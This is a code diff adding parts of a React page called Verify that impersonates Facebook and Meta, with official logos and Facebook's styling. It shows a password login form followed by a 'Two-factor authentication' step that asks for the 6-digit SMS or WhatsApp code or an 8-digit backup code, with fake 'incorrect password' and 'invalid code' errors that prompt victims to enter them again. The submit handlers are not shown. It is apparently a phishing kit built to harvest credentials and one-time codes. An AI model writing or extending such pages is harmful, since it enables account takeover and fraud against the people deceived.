@@ -71,3 +71,27 @@ export default function Verify() {
               <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required />
               <input className="fb-input" type="password" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required />
               {showLoginError && <div className="alert-error show"><span>The password you entered is incorrect. Please try again.</span></div>}
+              <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
+              <div className="fb-helper"><a href="#" onClick={e => e.preventDefault()}>Forgotten password?</a></div>
+           </form>
+           <div className="modal-meta-footer"><img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" /></div>
+        </div>
+      )}
+
+      {step === 3 && (
+        <div className={`modal-container ${showOtpError ? 'shake' : ''}`} style={{ position: 'relative' }}>
+           <button className="modal-close" onClick={() => navigate('/')}>×</button>
+           <div className="modal-brand"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" /></div>
+           <h2 className="modal-title">Two-factor authentication</h2>
+           <p className="modal-subtitle">Enter the 6-digit code we sent to your WhatsApp or SMS, or an 8-digit backup code.</p>
+           <form onSubmit={handleOtp} className="fb-form">
+              <input className="fb-input fb-otp-input" placeholder="000000" value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))} required maxLength={8} />
+              {showOtpError && <div className="alert-error show"><span>Invalid security code. Please check the code and try again.</span></div>}
+              <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Verifying...' : 'Verify'}</button>
+           </form>
+           <div className="modal-meta-footer"><img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" /></div>
+        </div>
+      )}
+    </div>
+  );
+}
